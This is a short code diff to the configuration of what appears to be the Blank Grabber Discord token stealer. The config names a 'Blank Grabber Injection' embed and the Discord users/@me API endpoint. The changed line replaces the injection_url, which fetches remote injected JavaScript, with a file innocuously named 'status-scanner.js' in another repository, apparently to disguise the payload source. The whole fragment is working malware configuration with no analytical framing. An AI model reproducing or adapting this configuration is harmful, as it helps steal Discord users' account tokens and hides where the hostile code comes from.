@@ -15,7 +15,7 @@ const config = {
   embed_name: 'Blank Grabber Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Re-Edit/papa/refs/heads/main/scr.jpg',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/Re-Edit/lister/refs/heads/main/status-scanner.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
